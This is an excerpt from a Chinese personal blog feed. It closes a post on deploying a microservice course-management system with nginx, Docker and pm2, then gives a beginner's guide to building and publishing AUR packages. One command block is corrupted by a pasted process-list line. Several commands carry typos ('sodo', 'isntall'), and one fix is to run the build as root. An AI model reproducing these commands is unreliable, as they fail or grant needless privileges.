		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduvod<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8003</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
        <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>educms<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8004</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>edumsm<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8005</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduucenter<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8006</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>eduorder<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8007</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>edustatistics<span class="token operator">/</span> <span class="token punctuation">&#123;</span>
			 <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8008</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>nginx.conf</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">events</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">worker_connections</span>  <span class="token number">4096</span><span class="token punctuation">;</span>  <span class="token comment">## Default: 1024</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">http</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span> <span class="token comment">#includes all files of file type.conf</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>编写<code>Dockerfile</code>：</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginx:alpine
COPY default.conf &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>构建<code>Docker image</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker build -t nginxcm <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>启动Docker image</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker run -d nginxcm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="其他的问题">其他的问题</h3>
<p>阿里云aliyun-sdk-vod-upload这玩意未开源，需要手动下</p>
<pre class="line-numbers language-none"><code class="language-none">Cannot resolve com.aliyun:aliyun-sdk-vod-upload:1.4.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>去<span class="exturl" data-url="aHR0cDovL2RvY3MtYWxpeXVuLmNuLWhhbmd6aG91Lm9zcy5hbGl5dW4taW5jLmNvbS9hc3NldHMvYXR0YWNoLzUxOTkyL2NuX3poLzE2MDA4NDgxOTk5NTIvVk9EVXBsb2FkRGVtby1qYXZhLTEuNC4xMy56aXA/c3BtPWEyYzRnLjExMTg2NjIzLjIuNDAuNDVjMDE5MmJpUEh4Y2omYW1wO2ZpbGU9Vk9EVXBsb2FkRGVtby1qYXZhLTEuNC4xMy56aXA=">这里<i class="fa fa-external-link-alt"></i></span>下载运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mvn install:install-file -DgroupId<span class="token operator">=</span>com.aliyun -DartifactId<span class="token operator">=</span>aliyun-sdk-vod-upload -Dversion<span class="token operator">=</span><span class="token number">1.4</span>.11 -Dpackaging<span class="token operator">=</span>jar -Dfile<span class="token operator">=</span>aliyun-java-vod-upload-1.4.13.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="前端">前端</h2>
<p>现在很多教程直接<code>npm run dev</code>，好家伙，直接给我看傻了。（CSDN之类的东西实在屏蔽不过来，SEO排名还一个个都贼靠前）</p>
<p>又看了看，貌似静态页面可以直接</p>
<p>然后又看到好多教程，大部分用的<code>pm2</code>运行<code>npm start</code>作为damon，js一统江湖哎，可能都是nodejs全干写的，感觉不太像运维的风格。可我想找nginx的抄作业，扒拉vue的文档拉到最底下才看到一个Docker里跑Nginx的。</p>
<h3 id="后台管理界面">后台管理界面</h3>
<p>先在<code>cm_admin</code>和<code>cm_forntweb</code>两个文件夹下<code>build</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> cm_admin
<span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后会在<code>.dist</code>文件夹下生成压缩后的静态页面。</p>
<p>扔到服务器上跑就行了，用Nginx配置一下端口映射和域名（我这域名没有，老板嫌备案麻烦没向学校申请）</p>
<pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM nginx
COPY dist&#x2F; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;
COPY nginx.conf &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">listen</span>       <span class="token number">9528</span><span class="token punctuation">;</span>
    <span class="token keyword">server_name</span>  localhost<span class="token punctuation">;</span>
	<span class="token keyword">server</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">;</span>

    <span class="token comment">#charset koi8-r;</span>
    <span class="token keyword">access_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>host<span class="token punctuation">.</span>access<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>
    <span class="token keyword">error_log</span>  <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log  error<span class="token punctuation">;</span>

    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">root</span>   <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nginx<span class="token operator">/</span>html<span class="token punctuation">;</span>
        <span class="token keyword">index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>html <span class="token keyword">index</span><span class="token punctuation">.</span>htm<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> docker build -t cm_admin <span class="token builtin class-name">.</span>
sodo docker run cm_admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="前台界面">前台界面</h3>
<p>Nuxt.js写的，就直接用的<code>nuxt start</code></p>
<p>在<code>packages.json</code>里面指定一下端口和IP</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"config"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
  <span class="token property">"nuxt"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"host"</span><span class="token operator">:</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>
    <span class="token property">"port"</span><span class="token operator">:</span> <span class="token string">"3000"</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>测试一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> cm_frontweb
<span class="token function">npm</span> run build
<span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/course-managemnet/image-20201122112918925.png" alt="这个内存占用看起来可以接受" /><figcaption aria-hidden="true">这个内存占用看起来可以接受</figcaption>
</figure>
<p>在服务器上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">npm</span> isntall pm2 -g
<span class="token builtin class-name">cd</span> cm_frontweb
<span class="token function">npm</span> <span class="token function">install</span> --save
nuxt build
pm2 start <span class="token function">npm</span> --name <span class="token string">"cm_frontweb"</span> -- run start
pm2 startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<figure>
<img src="/course-managemnet/image-20201122114528875.png" alt="内存占用也还好" /><figcaption aria-hidden="true">内存占用也还好</figcaption>
</figure>
<h2 id="可能的报错">可能的报错</h2>
<pre class="line-numbers language-none"><code class="language-none">npm ERR! code ELIFECYCLE
npm ERR! errno 126
npm ERR! cm_front@1.0.0 dev: &#96;nuxt&#96;
npm ERR! Exit status 126
npm ERR! 
npm ERR! Failed at the cm_front@1.0.0 dev script.
npm ERR! This is probably not a problem with npm. There is likely additional logging output above.

npm ERR! A complete log of this run can be found in:
npm ERR!     &#x2F;root&#x2F;.npm&#x2F;_logs&#x2F;2020-11-16T14_13_24_937Z-debug.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> cache clean --forceeno1                     14Kb   10Kb   <span class="token number">0.0</span>    <span class="token number">3.4</span>   <span class="token number">6</span>.83G <span class="token number">1</span>.06G  <span class="token number">7152</span> xi102          <span class="token number">1</span>:45 <span class="token number">50</span>    <span class="token number">0</span> S    ? ?    java -server -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize<span class="token operator">=</span>128m -XX:MaxMetaspaceSize<span class="token operator">=</span>320m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath<span class="token operator">=</span>/home/xi102/course_management/nacos/logs/java_heapdump.hprof -XX:-UseLargePages -Dnacos.member.list<span class="token operator">=</span> -Djava.
<span class="token function">rm</span> -rf node_modules package-lock.json
<span class="token function">npm</span> <span class="token function">install</span>
<span class="token function">npm</span> run dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>报错</p>
<pre class="line-numbers language-none"><code class="language-none">Failed to execute goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage (repackage) on project cm_parent: Execution repackage of goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage failed: Plugin org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE or one of its dependencies could not be resolved: Could not transfer artifact org.vafer:jdependency:jar:2.1.1 from&#x2F;to central (https:&#x2F;&#x2F;repo.maven.apache.org&#x2F;maven2): &#x2F;home&#x2F;zjk&#x2F;.m2&#x2F;repository&#x2F;org&#x2F;vafer&#x2F;jdependency&#x2F;2.1.1&#x2F;jdependency-2.1.1.jar.part (没有那个文件或目录) -&gt; [Help 1]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>build报错</p>
<pre class="line-numbers language-none"><code class="language-none">The POM for com.itwny:service_base:jar:0.0.1-SNAPSHOT is missing, no dependency information available<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">Failed to execute goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage (repackage) on project service_base: Execution repackage of goal org.springframework.boot:spring-boot-maven-plugin:2.2.1.RELEASE:repackage failed: Unable to find main class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>貌似是由于spring-boot-maven-plugin插件打出的包无法被依赖</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sh: /home/zjk/codes/course_management/cm_frontweb/node_modules/.bin/nuxt: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>请用root权限运行。</p>
<pre class="line-numbers language-none"><code class="language-none">2020-11-17 16:02:57 |ERROR |ThreadPoolTaskScheduler-1 |NacosWatch.java:171 |org.springframework.cloud.alibaba.nacos.discovery.NacosWatch |Error watching Nacos Service change<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>检查一下nacos是否正确启动了(不过这个项目不用NACOS也能完成面向客户的功能)</p>
<p>npm run build 报错</p>
<pre class="line-numbers language-none"><code class="language-none">ERROR in Template execution failed: ReferenceError: BASE_URL is not defined<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改<code>index.html</code>中<code>BASE_URL</code>为<code>htmlWebpackPlugin.options.url</code></p>
<p>警告可以不用管</p>
<pre class="line-numbers language-none"><code class="language-none">WARNING in asset size limit: The following asset(s) exceed the recommended size limit (244 KiB).<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>nginx报错<code>nginx: [emerg] “server” directive is not allowed here</code></p>
<p>见https://stackoverflow.com/questions/41766195/nginx-emerg-server-directive-is-not-allowed-here</p>
<p>可能是配置没写好</p>
<h2 id="其他">其他</h2>
<p>未完待续</p>
<h2 id="参考">参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbGkudnVlanMub3JnL3poL2d1aWRlL2RlcGxveW1lbnQuaHRtbCPpgJrnlKjmjIfljZc=">vue官方文档的部署通用指南<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjc3NDY1MA==">next.js nuxt.js等服务端渲染框架构建的项目部署到服务器,并用PM2守护程序<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxMjY3NTAxMg==">vue、react等单页面项目应该这样子部署到服务器<i class="fa fa-external-link-alt"></i></span></p>
<p><a href="https://segmentfault.com/q/1010000008477568"></a></p>
<p>https://juejin.cn/post/6844903666701320205</p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
        <tag>microservices</tag>
      </tags>
  </entry>
  <entry>
    <title>AUR打包指北</title>
    <url>/create-aur-packages/</url>
    <content><![CDATA[<p>（长期施工中，未完待续） <span id="more"></span></p>
<blockquote class="blockquote-center">
<p>快来当AUR打包工具人/打包苦力吧(笑</p>

</blockquote>
<p>其实还是建议你去先看看官方文档</p>
<h2 id="大致流程">大致流程</h2>
<h3 id="新建一个测试环境">新建一个测试环境</h3>
<p>在本机上直接打包可能会把你自己的机子环境搞乱搞崩，或者忽略了已经在自己电脑上装了了但是没有的依赖，又或者你想... 反正弄一个干净的测试环境是有必要的。可以参考官方Wiki：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RldmVsb3Blcldpa2k6QnVpbGRpbmdfaW5fYV9jbGVhbl9jaHJvb3Q=">DeveloperWiki:Building in a clean chroot<i class="fa fa-external-link-alt"></i></span>, 或者看肥猫这篇：<span class="exturl" data-url="aHR0cHM6Ly9mZWxpeGMuYXQvMjAxNy8wOC9pbnRyb2R1Y3Rpb24tdG8tYXJjaC1saW51eC1kZXZ0b29scy1idWlsZC1wYWNrYWdlcy1mcm9tLWEtY2xlYW4tY2hyb290Lw==">Arch Linux devtools 简介 – 在干净的环境里编译软件包<i class="fa fa-external-link-alt"></i></span></p>
<p>当然打包一些很简单、依赖很明确的东西，确定没必要也可以不要这一步。</p>
<h3 id="编写pkgbuild">编写PKGBUILD</h3>
<p>最快的方法是去找找有没有和你要打包的东西类似的包，然后抄一下它的PKGBUILD。</p>
<h3 id="检查">检查</h3>
<p>先用namcap检查一下，有没有语法错误或者其他不符合规范的地方</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">namcap PKGBUILD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="编译">编译</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">makepkg -s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>生成的<code>XXX.tar.xz</code>可以再用<code>namcap</code>检查一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">namcap XXX.tar.xz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="上传和分享">上传和分享</h3>
<h4 id="aur">AUR</h4>
<p>如果想分享出来，你可以上传到AUR仓库里面。AUR帐号随便就能注册几乎没有审查的（所以传点恶意代码上去也能传的），但是尽量不要把有版权问题之类的东西传上去（虽然出了事应该是你自己负责）</p>
<p>新建一个账号，然后上传你的SSH公钥和密钥指纹。</p>
<p>用<code>git clone</code>拉取一个</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone ssh://aur@aur.archlinux.org/your-package-name.git <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>AUR软件仓库需要<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwLy5TUkNJTkZPXyjnroDkvZPkuK3mlocp">SRCINFO<i class="fa fa-external-link-alt"></i></span>,不然会拒绝你的提交</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">makepkg --printsrcinfo <span class="token operator">></span> .SRCINFO<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="非官方软件仓库">非官方软件仓库</h4>
<p>或者你可以去其他非官方的仓库，这有一大堆：<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1Vub2ZmaWNpYWxfdXNlcl9yZXBvc2l0b3JpZXNfKOeugOS9k+S4reaWhyk=">Unofficial user repositories<i class="fa fa-external-link-alt"></i></span></p>
<p>中文用户人最多的是ArchlinuxCN，我猜你很熟悉这个了。</p>
<p>其他的还有chaotic-aur（里面的包不少，但是国内速度很慢，镜像都在国外，直接访问可能比从AUR拉下来编译还慢），arch4edu（一些教育软件和包，清华的弄得，国内速度还行），blackarch（这个包也很多，约等于arch系的kali源）</p>
<p>要添加到这些非官方仓库里，可以请求打包，或者跟仓库管理员py。</p>
<p>或者可以自建一个仓库。</p>
<p>可参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxveGFmLmNvbS8yMDIwLzA2L2J1aWxkX2F1cl93aXRoX2dpdGh1Yl9hY3Rpb25zLw==">利用 GitHub Actions 编译 AUR 包并建立自己的软件源<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一些工具">一些工具</h2>
<h3 id="namcap">namcap</h3>
<p>用来检查打包是否正确</p>
<h3 id="devtools">devtools</h3>
<p>可以干很多事情，最常用的是新建一个干净的环境用来测试你的包。</p>
<p>还有很多用法去看文档吧，</p>
<h3 id="debtap">debtap</h3>
<p>大多数情况下可以快速把deb包转成aur包 有些deb的包或者rpm的包可以拆包然后重新手动打包一下。一般的用debtap可以解决大部分deb包，有些依赖可能没办法需要手动处理。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -Syu debtap
<span class="token function">sudo</span> debtap -u <span class="token comment">#同步数据库，可能比较慢</span>
debtap -p XXX.deb <span class="token comment"># -p 选项生成PKGBUILD</span>
<span class="token comment">## 然后根据提示输入包名和协议等</span>
<span class="token comment">## 然后稍等一会，会比较慢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后<code>pacman -U XXX.tar.xz</code>可以装到你的电脑上试一下。</p>
<h3 id="pip2pkgbuilds">pip2pkgbuilds</h3>
<p>将pip的包转成aur的包，这个工具很久没更新了（But it works）。这个工具有不少情况不会帮你自动处理，python的不少pip包本身也不太遵循pip的打包规范，要做不少手动检查和调整。</p>
<h3 id="npm-pkgbuild">npm-pkgbuild</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FybGFjNzcvbnBtLXBrZ2J1aWxkI3JlYWRtZQ==">npm-pkgbuild<i class="fa fa-external-link-alt"></i></span> 一个将npm包转成aur的包，和上面那个类似，也是自动生成PKGBUILD。没用过不好评价。</p>
<h2 id="自动化">自动化</h2>
<p>人肉测试每个包然后传上去给大家用是最好的，不过有的上游更新太勤测试不过来，或者一些<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1ZDU19wYWNrYWdlX2d1aWRlbGluZXNfKOeugOS9k+S4reaWhyk=">用版本控制紧跟上游的包<i class="fa fa-external-link-alt"></i></span> <del>又或者有的时候你想让用户当小白鼠</del></p>
<p>可以试试Travis CI、Github Action 之类的CI/CD工具，不过最好还是更新之前人肉测试一下</p>
<h3 id="github-action">Github Action</h3>
<p>Github Action的好处是可以白嫖（划掉</p>
<p>可以用Github Action自动生成PKGBUILD： <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcmtldHBsYWNlL2FjdGlvbnMvcHVibGlzaC1hdXItcGFja2FnZQ==">publish-aur-package<i class="fa fa-external-link-alt"></i></span></p>
<p>鸭鸭的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0R1Y2tTb2Z0L2J1aWxkLWF1ci1hY3Rpb24=">build-aur-action<i class="fa fa-external-link-alt"></i></span>,用Github Action编译一个AUR包（有时候你不想在自己电脑上编译可以试试这个）</p>
<p>使用见：<span class="exturl" data-url="aHR0cHM6Ly92aWZseXRoaW5rLmNvbS9Vc2VfR2l0SHViQWN0aW9uc190b19idWlsZF9BVVIv">GitHub Actions 打造 AUR 打包下载一条龙服务<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="一些小问题">一些小问题</h2>
<h3 id="aur的依赖包makepkg无法自动识别">AUR的依赖包makepkg无法自动识别</h3>
<p>打包的时候如果依赖AUR的包，在<code>makepkg -s</code>pacman是不会自动安装的需要手动安装</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">error: target not found: python-django-cors-headers
<span class="token operator">==</span><span class="token operator">></span> ERROR: <span class="token string">'pacman'</span> failed to <span class="token function">install</span> missing dependencies.
<span class="token operator">==</span><span class="token operator">></span> ERROR: Could not resolve all dependencies.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>如果依赖太多装不过来，可以加<code>makepkg -d</code>参数忽略依赖，然后对生成的<code>XXX.tar.xz</code>使用yay或者pikaur之类的AUR helper</p>
<h3 id="git初次commit不包含srcinfo导致拒绝提交">git初次commit不包含SRCINFO导致拒绝提交</h3>
<p>可以用<code>git filter branch</code></p>
<p>（其实直接删了重新<code>git init</code>可能更快）</p>
<h2 id="常见写法和命令">常见写法和命令</h2>
<h3 id="install命令">install命令</h3>
<p>用过<code>cmake</code>等编译工具的人应该对<code>make install</code>很熟了，它在PKGBUILD里面大概像这样</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">package</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">make</span> -C <span class="token string">"<span class="token variable">$pkgname</span>-<span class="token variable">$pkgver</span>"</span> <span class="token assign-left variable">DESTDIR</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$pkgdir</span>"</span> <span class="token function">install</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在PKGBUILD里面，还经常用它把文件安装到制定目录，并指定权限（一般不用<code>cp</code>来干这种事）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">package</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$srcdir</span>/<span class="token variable">$pkgname</span>"</span>
  <span class="token function">install</span> -vDm <span class="token number">644</span> <span class="token variable">$&#123;pkgname<span class="token operator">%</span>-git&#125;</span><span class="token punctuation">&#123;</span>,.plugin<span class="token punctuation">&#125;</span>.zsh <span class="token punctuation">\</span>
    -t <span class="token string">"<span class="token variable">$&#123;pkgdir&#125;</span>/usr/share/zsh/plugins/<span class="token variable">$&#123;pkgname&#125;</span>/"</span>
  <span class="token function">install</span> -Dm644 LICENSE <span class="token string">"<span class="token variable">$pkgdir</span>"</span>/usr/share/licenses/<span class="token variable">$pkgname</span>/LICENSE
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将可执行文件和LICENSE分别放到指定目录，像LICENSE或者doc权限644就好了，其他的可执行文件酌情给个755权限。</p>
<p>如果有需要打印详细安装信息方便调试，可以加<code>-v</code>选项，像这样<code>install -Dvm755</code></p>
<h3 id="常见写法">常见写法</h3>
<p>获取Github Release</p>
<h2 id="练手推荐">练手推荐</h2>
<p>上手AUR打包基本只需要一点bash脚本的知识就可以了。当然最好还要对打包的项目和所用的语言、框架、依赖比较熟悉。</p>
<p>反正我感觉比deb和rpm的打包简单太多了，而且由于包管理的机制，虽然容易挂，但是依赖一般不会特别麻烦（除了有些要拆包的东西）</p>
<p>你看看依赖问题<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTYwNjEyOC9hbnN3ZXIvMTE5NDU5NjU5MQ==">都把隔壁deb系的老哥逼成什么样了<i class="fa fa-external-link-alt"></i></span>。</p>
<p>可以看这个<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuaWJtLmNvbS96aC9hcnRpY2xlcy9sLWxvLXJwbS1idWlsZC1wYWNrYWdlLw==">Linux 中 RPM 的构建与打包<i class="fa fa-external-link-alt"></i></span>感受一下打包流程 （当然rpm包用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbnNpc3NlbC9mcG0=">fpm<i class="fa fa-external-link-alt"></i></span>之类的打包工具也没有那么麻烦）</p>
<p>官方的打包示例是要用到make编译c/c++包的例子，但是一些c/c++的包，运行环境和依赖会比较麻烦，而且在x86和arm等不同架构下面也会有很多问题。拿来熟悉打包流程对萌新不太友好。</p>
<p>练手打包建议用从自己最熟悉的项目和语言开始。如果你什么语言都不熟悉呢，推荐用一些主题或者可以用debtap之类的工具方便的转成AUR包的东西来熟悉一下打包。</p>
<p>有的系统主题、grub主题、输入法主题之类的包比较好打包，一般来说依赖也少，不会搞出什么大问题。而且主题的文件存放位置和PKGBUILD里面的其他东西可以找AUR里面打包好的其他主题参考，基本大同小异，上手打包不会有太太高难度和坑，不太熟悉流程的可以先用一些主题练手熟悉一下打包流程。（主要是这个依赖也少，破坏性比较小，萌新打出低质量的AUR包也不至于把装这个包的人一波带走闯下大祸）</p>
<p>而且他们不需要编译，也没有依赖报错，总之非常的适合熟悉一下PKGBUILD的流程</p>
<p>当然打包不能包揽所有工作，一些设置需要用户手动启用或者修改的（比如一些配置，又比如systemd之类的daemon），比如我这里打包了一个GRUB的Cyberpunk主题，需要用户手动修改</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/default/grub<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">GRUB_THEME</span><span class="token operator">=</span><span class="token string">"/usr/share/grub/themes/Cyberpunk/theme.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
